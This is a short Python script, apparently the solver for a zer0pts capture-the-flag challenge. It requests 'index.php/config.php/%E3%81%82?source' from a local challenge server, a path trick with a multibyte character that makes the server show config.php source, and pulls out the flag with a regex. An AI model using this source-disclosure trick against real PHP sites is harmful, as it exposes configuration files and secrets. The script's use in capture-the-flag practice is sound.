import re
import os
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8003')
url = 'http://{}:{}/'.format(host, port)

r = requests.get(url + 'index.php/config.php/%E3%81%82?source')
flag = re.findall(r'(zer0pts\{.+?\})', r.content.decode())[0]

print(flag)